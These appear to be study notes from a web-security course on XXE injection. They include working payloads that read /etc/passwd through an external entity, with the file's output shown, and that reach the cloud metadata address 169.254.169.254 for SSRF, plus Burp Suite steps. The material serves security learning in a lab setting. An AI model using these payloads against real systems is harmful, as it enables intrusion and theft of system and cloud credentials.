# 20. XXE (XML External Entity) Injection

5th more common OWASP Top 10

## What is XML

- **Extensible Markup Language**
- Use: Store and transport data

```
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder></heading>
  <body>Don't forget me this weekend!</body>
</note>
```

## Exploiting a Basic XXE Injection

Content-Type: application/xml

```
<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>4</productId>
    <storeId>1</storeId>
  </stockCheck>
```

Burp Suite -> Send to Repeater

Manipulate this XML markup to give us useful data

```
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
  </stockCheck>
```

Outcome:
```
root:x:0:0:root:/root:/bin/bash
deamon:x:1:1:deamon:/usr/sbin:/usr/sbin/nologin
peter:x:2001:2001::/home/peter:/bin/bash
```

## Discovering an SSRF Through a Blink XXE

Hacker -> XXE -> Vulnerable Website -> SSRF -> Server with Sensitive Data 169.254.169.254

```
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
  <stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
  </stockCheck>
```

Instead of specifying a file, we are specifying a remote server to communicate with and use that to gather information

1. Access internal resources
2. Discover blind / out-of-bound XXE

---

